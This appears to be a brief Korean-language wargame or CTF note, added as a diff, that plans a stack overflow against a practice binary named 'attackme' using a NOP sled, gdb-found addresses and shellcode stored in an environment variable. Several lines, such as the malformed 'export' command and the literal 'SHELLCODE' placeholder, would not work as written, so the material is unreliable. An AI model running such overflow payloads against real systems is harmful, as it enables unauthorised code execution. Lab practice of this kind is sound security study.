@@ -1,0 +1,10 @@
+-쉘함수가 이전문제와 다르게 없으므로 Hello there!\n 이 저장된 위치에 쉘코드를 삽입하면 될 것 같다.
+
+-gdb로 뜯자.
+
+
+-printit 0x8048490
+-export SHELLCODE == 0xbffff89a
+
+
+(python -c 'print "\x90"*40 + "SHELLCODE"';cat)|./attackme
